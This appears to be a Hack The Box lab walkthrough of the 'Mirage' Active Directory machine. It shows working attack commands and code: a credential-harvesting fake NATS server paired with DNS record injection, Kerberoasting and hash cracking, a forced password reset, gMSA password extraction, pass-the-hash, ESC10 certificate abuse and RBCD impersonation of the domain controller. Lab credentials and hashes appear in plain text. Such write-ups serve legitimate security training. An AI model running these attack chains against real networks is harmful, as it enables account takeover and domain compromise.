- - - 
created : 20-06-2025 

Tags : #hard 

Released on 19 Jul 2025 (Season 8)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ rustscan -a mirage.htb -- -A
Open 10.10.11.78:53
Open 10.10.11.78:88
Open 10.10.11.78:111
Open 10.10.11.78:139
Open 10.10.11.78:135
Open 10.10.11.78:389
Open 10.10.11.78:445
Open 10.10.11.78:464
Open 10.10.11.78:593
Open 10.10.11.78:636
Open 10.10.11.78:2049
Open 10.10.11.78:3268
Open 10.10.11.78:3269
Open 10.10.11.78:4222
Open 10.10.11.78:5985
Open 10.10.11.78:9389
Open 10.10.11.78:47001
Open 10.10.11.78:49664
Open 10.10.11.78:49666
Open 10.10.11.78:49665
Open 10.10.11.78:49667
Open 10.10.11.78:49668
Open 10.10.11.78:51617
Open 10.10.11.78:51626
Open 10.10.11.78:51627
Open 10.10.11.78:51642
Open 10.10.11.78:51648
Open 10.10.11.78:51671
Open 10.10.11.78:51685
Open 10.10.11.78:56442

PORT      STATE SERVICE         REASON          VERSION
53/tcp    open  domain          syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec    syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-29 14:02:07Z)
111/tcp   open  rpcbind         syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn     syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap            syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)

445/tcp   open  microsoft-ds?   syn-ack ttl 127
464/tcp   open  kpasswd5?       syn-ack ttl 127
593/tcp   open  ncacn_http      syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)

2049/tcp  open  nlockmgr        syn-ack ttl 127 1-4 (RPC #100021)
3268/tcp  open  ldap            syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap        syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
4222/tcp  open  vrml-multi-use? syn-ack ttl 127

5985/tcp  open  http            syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf          syn-ack ttl 127 .NET Message Framing
47001/tcp open  http            syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
51617/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
51626/tcp open  ncacn_http      syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
51627/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
51642/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
51648/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
51671/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
51685/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
56442/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
```

This is a [Active Directory](../../../3%20-%20Tags/Hacking%20Concepts/Active%20Directory.md) environment, you can check [Intro to Active Directory Theory](../Academy/Intro%20to%20Active%20Directory%20Theory.md)  and better understand all processes.

Let's add `dc01.mirage.htb` to `/etc/hosts`.
# Enumeration
## RPC (2049) 

Let's check for unmounted shares:

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ nxc nfs 10.10.11.78 --shares
NFS         10.10.11.78     2049   10.10.11.78      [*] Supported NFS versions: (2, 3, 4) (root escape:False)                                                                                                 
NFS         10.10.11.78     2049   10.10.11.78      [*] Enumerating NFS Shares
NFS         10.10.11.78     2049   10.10.11.78      UID        Perms    Storage Usage    Share                          Access List                                                                           
NFS         10.10.11.78     2049   10.10.11.78      ---        -----    -------------    -----                          -----------                                                                           
NFS         10.10.11.78     2049   10.10.11.78      4294967294 r--      15.9GB/19.8GB    /MirageReports                 No network 
```

There is a share called `MirageReports` so let’s see the contents:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/user]
└─$ nxc nfs 10.10.11.78 --share '/MirageReports' --ls '/' 
NFS         10.10.11.78     2049   10.10.11.78      [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.10.11.78     2049   10.10.11.78      UID        Perms  File Size     File Path
NFS         10.10.11.78     2049   10.10.11.78      ---        -----  ---------     ---------
NFS         10.10.11.78     2049   10.10.11.78      4294967294 dr--   64.0B         /MirageReports/.
NFS         10.10.11.78     2049   10.10.11.78      4294967294 dr--   64.0B         /MirageReports/..
NFS         10.10.11.78     2049   10.10.11.78      4294967294 -r-x   8.1MB         /MirageReports/Incident_Report_Missing_DNS_Record_nats-svc.pdf
NFS         10.10.11.78     2049   10.10.11.78      4294967294 -r-x   8.9MB         /MirageReports/Mirage_Authentication_Hardening_Report.pdf
```

Let's mount it on our machine:

```bash
─$ mkdir mirage_reports_files
─$ sudo mount -t nfs 10.10.11.78:/MirageReports mirage_reports_files                                                                                   
─$ cd mirage_reports_files                                                                                                      
─$ ls
Incident_Report_Missing_DNS_Record_nats-svc.pdf  Mirage_Authentication_Hardening_Report.pdf
```

We found another hostname `nats-svc.mirage.htb` in `Incident_Report_Missing_DNS_Record_nats-svc.pdf` and add it to `/etc/hosts`
# Exploit

### DNS Spoofing

Default port for NATS service is `4222` and we found that port open with the previous [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) scan.

Host a fake server with [Python](../../../3%20-%20Tags/Programming%20Languages/Python.md):

```bash
└─$ cat fake_server.py 
#!/usr/bin/env python3
import socket
import json
import re

def extract_creds(data):
    if b"CONNECT" in data:
        try:
            # Find JSON in CONNECT message
            text = data.decode('utf-8', errors='ignore')
            match = re.search(r'CONNECT\s+({[^}]+})', text)
            if match:
                creds = json.loads(match.group(1))
                if 'user' in creds and 'pass' in creds:
                    print(f"FOUND: {creds['user']}:{creds['pass']}")
                    return True
        except:
            pass
    return False

def fake_nats(host="0.0.0.0", port=4222):
    with socket.socket() as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(5)
        
        print(f"NATS fake server on {host}:{port}")
        
        while True:
            try:
                client, addr = s.accept()
                print(f"{addr[0]}:{addr[1]}")
                
                with client:
                    # Send min NATS INFO
                    info = '{"server_id":"FAKE","version":"2.11.3","auth_required":true}'
                    client.send(f"INFO {info}\r\n".encode())
                    
                    # Read client data
                    data = client.recv(2048)
                    if data:
                        print(f"{data[:100]}...")
                        extract_creds(data)
                    
                    # Send auth error
                    client.send(b"-ERR 'Bad Credentials'\r\n")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{e}")

if __name__ == "__main__":
    fake_nats()
```

```bash
└─$ python3 fake_server.py   
NATS fake server on 0.0.0.0:4222
```

Now we spoof with `nsupdate` (injecting fake DNS records):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/user]
└─$ nsupdate                                     
> server 10.10.11.78
> update add nats-svc.mirage.htb 3600 A 10.10.15.209  # your IP here
> send
```

We check the server:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/user]
└─$ python3 fake_server.py   
NATS fake server on 0.0.0.0:4222
10.10.11.78:61998
b'CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_re'...
FOUND: Dev_Account_A:hx5h7F5554fP@1337!
```

And we have some credentials: `Dev_Account_A:hx5h7F5554fP@1337!`

Check [SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md):

```bash
└─$ netexec smb 10.10.11.91 -u Dev_Account_A -p 'hx5h7F5554fP@1337!' --shares
SMB         10.10.11.91     445    10.10.11.91      [*]  x64 (name:10.10.11.91) (domain:10.10.11.91) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.91     445    10.10.11.91      [-] 10.10.11.91\Dev_Account_A:hx5h7F5554fP@1337! STATUS_NOT_SUPPORTED
```

We can't access there, we need to install `nats` and verify the credentials here: https://github.com/nats-io/natscli

```bash
└─$ go install github.com/nats-io/natscli/nats@latest 

nats --server nats://10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
```

Here the creds are valid, so list the data streams:

```bash
─$ nats --server nats://10.129.254.128:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' 

	stream ls 

auth_logs <SNIP>
```

We found `auth_logs`, check details:

```bash
stream info auth_logs
```

So it's used to store the authentication logs, as the name says.

Create a new consumer to read the messages in this stream:

```bash
consumer add auth_logs test --pull --ack explicit
```

Read the messages:

```bash
consumer next auth_logs test --count=15

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

<SNIP>
```

We found other credentials: `david.jjackson:pN8kQmn6b86!1234@`
### Kerberos

Update time and `krb5` config:

```bash
─$ sudo timedatectl set-ntp off
─$ sudo rdate -n 10.10.11.78
─$ sudo nano /etc/krb5.conf
```

Request a `TGT`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/user]
└─$ impacket-getTGT mirage.htb/'david.jjackson':'pN8kQmn6b86!1234@' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in david.jjackson.ccache
```
# Lateral Movement
## Bloodhound

Collect:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/user]
└─$ bloodhound-python -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -d mirage.htb -ns 10.10.11.78 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: mirage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 12 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 21 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.mirage.htb
INFO: Done in 00M 10S
```

GUI:

![Pasted image 20251029161509.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251029161509.png)

**OTHER INFO**:

- `Administrator` - Domain Admin
- `david.jjackson` - IT_Staff/Admins (current user)
- `javier.mmarshall` - IT_Contractors (DISABLED - `userAccountControl: 66050`)
- `mark.bbond` - IT_Support (has certificates)
- `nathan.aadam` - IT_Admins (has SPN: HTTP/exchange.mirage.htb)
- `Mirage-Service$` - Group Managed Service Account (`gMSA`)

`nathan.aadam` account is Kerberoastable.
## Kerberoasting

We can use `impacket-GetUserSPNs`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/user]
└─$ impacket-GetUserSPNs 'mirage.htb/david.jjackson' -dc-host dc01.mirage.htb -k -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation 
------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-23 23:18:18.584667  2025-07-04 22:01:43.511763             



$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$2fcc3431623ec2746330dfec419979cb$0ce941dcc9ed4907ca2b512eea23a039068d9207d128b00774778c516dd3d979f8933b4aa82fc0105d28d1df90be7b3e81ded73b1a4d1de80df32d7e11e5f2513b343e52e8546a2b55302f5be64f9f3f4ec46f30502efbc1c5a4df6cfd92057b65ae2b3b31b5993bd79a15d24b1d1e3c6a032577e3703e5cd89a2d4c5ba72b09fe50f83c8b9dc76458c8b69ecc9bcb9902c2b3b7779ff43c0023d3a49714fb52438fb653aa54b50fad52df83ff999db26687652182dd2edb161e7329b05afe25dfe140e0467243331507819d35ef7c51b73884b19cc75d9a7f96ad925ef5fea58d24511fe78d0fdf04dcba7033b47b6434cd786751d5b3e3ee2b6ce391beeb8f13b7f98c61c307dc58573fe1cfe8536d00a5098d5658333a3f52b87101d9c311dc772698030d47cddfa9731fe4d1c38f9d4d33e146173592a84b112c984a767bd847794716ce4ce813eebbacdd9c4fe321f2f98e57d8f3cdf863cd7033a246aa5731fad470a0f564181c72bca17abbdf3807771924e20dcc4ede2dcd2369a63aa13ad0bb9f90aaf404b33652a9b760853f59da8888a50ad8070b3ddae674df387a6c1fbf41b31e3110501c06671c10328935cffb9ad9416742c9cf0b033ca3e6e535a137713cd9bb74759741ce0bb10d8777b1f594f65a28a0d97200e8d7a9713610332ab0fbff92729edc838c2ab07c5d6865f3c76abeb092f647ba4f3dbe7611915ecefb82134273ebabfcd9aeeda06cacdb7046237ba441392691f08f2ef1f3926c75a10902d50ad5252014e65d0e05f3c764694539aac4c5cb38244df17468230c2ab1e4066a10c2fb6d7247adc0e2343c15f0cefa63bf8d9d1d37b3559cbd847917150519c53b9c20596ac770ebbb4fa65045bd2b5b95486cf61a8a9ffd602c0a94a0b5c0c219ecf0f8409f103e0a302af79505a4c9b9579a4c270c73d059c9148e49acfeb291cbe3813d7fc594b06f1cf180ceb5226775c08e529a64ccd70a8dc3214fe3f8895e94a0747b5872646810fe151a3c826aa1cca76c4d8e4f173109080b381ab284df86796a8919b9b5e4e33efc66191c6b99838e9e567cd077d3236edfe8109f73c9a1131cd36d6967a8d22354c0758c2bb8801cc424db3796d1094f4458eba03912223b2ef96e52e47ca13d175867bf2c4121c8daa63d27811ba976e15a04dce4887013132aedd6e86741be3cda2d0851fdeab8991511b687363ccb8d23a059f548c18884be24b841e7e0b3104a819e3443e584bf98e14a80ba1e773e685245774715c74148f41b1b8a289e9d74df519e8ad9590e0b6c12cce2f5c2b8345977489b287d77e24593770835c60e90df614752ed2eb9d1e7215d90e6011a56819acf940dd87a210ba7185e590af4e64d382ac5df594ececbeb180ee02c3cdabba5575db508f7ed00524dcae0374c6e7f9375c023f95d89919d229ac81bb2cf82d8aec870d544053dfedbf0ae6ee75bc81803e278e65ba8146a563925902920e4c5cd9ed31d9f769d9330e28d1673a434eeb0f9de34e9b14840a294c8d98f36582a8a17b28d06fd1f43986ed7e7467a19a7ea
```

Save it and crack it with [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) or [Hashcat](../../../3%20-%20Tags/Hacking%20Tools/Hashcat.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/user]
└─$ john hash.nathan -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3edc#EDC3        (?)     
1g 0:00:00:02 DONE (2025-10-29 16:17) 0.3816g/s 4759Kp/s 4759Kc/s 4759KC/s 3june**..3ddfiebw
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Get the ticket:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/user]
└─$ impacket-getTGT mirage.htb/'nathan.aadam':'3edc#EDC3'     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in nathan.aadam.ccache

─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Mirage/user/nathan.aadam.ccache 
```

Now we can use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/user]
└─$ evil-winrm -i dc01.mirage.htb -k nathan.aadam.ccache -r MIRAGE.HTB
 
*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> type user.txt
  HTB{{REDACTED_FLAG}}
```

User owned.
# Privilege Escalation
## Nathan to Javier
### Bloodhound again

Collect:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ bloodhound-python -u 'nathan.aadam' -p '3edc#EDC3' -d mirage.htb -ns 10.10.11.78 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: mirage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 12 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 21 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.mirage.htb
INFO: Done in 00M 11S
```

Check GUI:

![Pasted image 20251029162846.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251029162846.png)

We can see that `mark.bbond` is member of the `IT_Support` group and has **ForceChangePassword** privilege over `javier.mmarshall` account. 

And we know that `javier.mmarshall` account is disabled so we can leverage this point to enable back the account and reset the password.
### WINpeas

After running [WinPEAS](../../../3%20-%20Tags/Hacking%20Tools/WinPEAS.md) on the target and checking results, we can see a password for `mark.bbond` account in clear-text:

```rust
DefaultPassword : 1day@atime
```

So we try a request for the ticket:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ impacket-getTGT mirage.htb/'mark.bbond':'1day@atime'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in mark.bbond.ccache
```

And we got it.
### ForceChangePassword

Enable `javier.mmarshall` account from `nathan.aadam` shell (using `mark` creds):

```bash
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> $Password = ConvertTo-SecureString "1day@atime" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> $Cred = New-Object System.Management.Automation.PSCredential ("MIRAGE\mark.bbond", $Password)
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Enable-ADAccount -Identity javier.mmarshall -Credential $Cred

*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Get-ADUser -Identity "javier.mmarshall" -Properties Enabled, MemberOf


DistinguishedName : CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
Enabled           : True
GivenName         : javier.mmarshall
MemberOf          : {CN=IT_Contractors,OU=Groups,OU=Contractors,OU=IT_Staff,DC=mirage,DC=htb}
Name              : javier.mmarshall
ObjectClass       : user
ObjectGUID        : c52e731b-30c1-439c-a6b9-0c2f804e5f08
SamAccountName    : javier.mmarshall
SID               : S-1-5-21-2127163471-3824721834-2568365109-1108
Surname           :
UserPrincipalName : javier.mmarshall@mirage.htb

*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Get-ADUser javier.mmarshall -Properties Enabled, LogonHours | Select-Object Name, Enabled, LogonHours

Name             Enabled LogonHours
----             ------- ----------
javier.mmarshall    True {0, 0, 0, 0...}

*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> $logonhours = Get-ADUser mark.bbond -Properties LogonHours | Select-Object -ExpandProperty logonhours
[byte[]]$hours1 = $logonhours

*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Set-ADUser -Identity javier.mmarshall -Credential $Cred -Replace @{logonhours = $hours1}

*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Get-ADUser javier.mmarshall -Properties Enabled, LogonHours 


DistinguishedName : CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
Enabled           : True
GivenName         : javier.mmarshall
LogonHours        : {255, 255, 255, 255...}
Name              : javier.mmarshall
ObjectClass       : user
ObjectGUID        : c52e731b-30c1-439c-a6b9-0c2f804e5f08
SamAccountName    : javier.mmarshall
SID               : S-1-5-21-2127163471-3824721834-2568365109-1108
Surname           :
UserPrincipalName : javier.mmarshall@mirage.htb
```

This will auto-reset after a while, re-run if needed.

We can use `BloodyAD` again to change his password:

```bash
└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Mirage/root/mark.bbond.ccache                                                                                            
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@atime' set password javier.mmarshall 'Hacker123!'
[+] Password changed successfully!
```

Now ticket request:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/user]
└─$ impacket-getTGT mirage.htb/'javier.mmarshall':'Hacker123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in javier.mmarshall.ccache

└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Mirage/root/javier.mmarshall.ccache 
```
## Javier to Mirage-Service$

### ReadGMSAPassword

We got `javier.mmarshall` account, and he has [readGMSAPassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword) over `Mirage-Service$` account  (check [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md)) , using `GMSADumper`:

```bash
└─$ python3 gMSADumper.py -k -d mirage.htb -l dc01.mirage.htb
```

Not working for me so i try to use `BloodyAD` again for that:

```bash
└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Mirage/root/javier.mmarshall.ccache 

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u javier.mmarshall -p 'Hacker123!' get object 'Mirage-Service$' --attr msDS-ManagedPassword

distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:738eeff47da231dec805583638b8a91f
msDS-ManagedPassword.B64ENCODED: JG2I2ThjiMa7YkwBdrCz2KSlw3EcO3bobmTqhqlws3vPY6S2x6Tqd4AOKXSc3yCWwI2rjXaajzbPwGIro70RzSzVf/E1YL+a4Ux0Bd3bsZxv65rJuWIklIIoIeAcXmX6pKsBJzRNySa/yOMXne8Zx0Bmr+/5n9sN0xA6eVNaDfzYOGW6ccU9FKSzzQ77uUu+nBRL66+/fNXdGXY8RJAehh3z3U4AerkuldPTCkhVuKENJHXDdLwEJ3Td4QFG0wNpzQWRfkmaDAVepTtPhLv/xjq7AsAKfE1ihsTB2FXT7U7hlnRV2Z4jYVfKJM+UFYrfjLMyutjHiH5DBqSUtlOyow==
```

Worked, now have the **NTLM hash** of Mirage-Service$.

We can request a ticket with `Pass-the-Hash`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ impacket-getTGT mirage.htb/Mirage-Service:38eeff47da231dec805583638b8a91f  -hashes :738eeff47da231dec805583638b8a91f  -dc-ip 10.10.11.78
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Mirage-Service.ccache

─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Mirage/root/Mirage-Service.ccache 
```
## Mirage-Service$ to Administrator

From [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md) we can see that `mark.bbond` has **AllowedToAct** over `DC01` account, And also `DC01` has **[CoerceToTGT](https://bloodhound.specterops.io/resources/edges/coerce-to-tgt)** over `Mirage.htb` domain which we can **DCSync** with `secretsdump.py`.

The `altSecurityIdentities` attribute that control certificate-to-user mapping is related to [ESC10](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication) privilege escalation.

We can leverage `ESC10` to escalate our privilege to `Administrator`.

**Step 1**: Modify UPN of `mark` (update `altSecurityIdentities` attribute)

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ certipy-ad account update \
  -user 'mark.bbond' \
  -upn 'dc01$@mirage.htb' \
  -u 'mirage-service$@mirage.htb' \
  -k -no-pass \
  -dc-ip 10.10.11.78 \
  -target dc01.mirage.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : dc01$@mirage.htb
[*] Successfully updated 'mark.bbond'
```

**Step 2**: Revert `mark` UPN and Request a Certificate

```bash
└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Mirage/root/mark.bbond.ccache 
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ certipy-ad req -k \
-target dc01.mirage.htb \
-ca 'mirage-DC01-CA' \
-template 'User' \
-dc-ip 10.10.11.78
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 12
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
File 'dc01.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'dc01.pfx'
```

Now we need to  Update again `altSecurityIdentities` to enable certificate authentication :

```bash
─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Mirage/root/Mirage-Service.ccache 

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ certipy-ad account -u 'Mirage-Service$' -k -target dc01.mirage.htb -upn 'mark.bbond@mirage.htb' -user 'mark.bbond' update -dc-ip 10.10.11.78
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : mark.bbond@mirage.htb
[*] Successfully updated 'mark.bbond'
```
### LDAP + RBCD

We got the certificate for `dc01$`, let's authenticate for the ticket:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.11.78:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\\DC01$'
Type help for list of commands

# whoami
u:MIRAGE\DC01$

# set_rbcd dc01$ nathan.aadam
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb

Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=nathan.aadam,OU=Users,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1110
Delegation rights modified successfully!
nathan.aadam can now impersonate users on dc01$ via S4U2Proxy
```

We granted `RBCD` so `nathan` can now impersonate `dc01$` (now he has the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the DC01 computer object)

Request service ticket by impersonating `dc01$` machine account (we are using **S4U2Self + S4U2Proxy** to get a service ticket as `dc01$` here):

```bash
└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Mirage/user/nathan.aadam.ccache  

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Mirage/root]
└─$ impacket-getST -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/nathan.aadam:3edc#EDC3' -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@CIFS_dc01.mirage.htb@MIRAGE.HTB.ccache

─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Mirage/root/DC01\$@CIFS_dc01.mirage.htb@MIRAGE.HTB.ccache
```

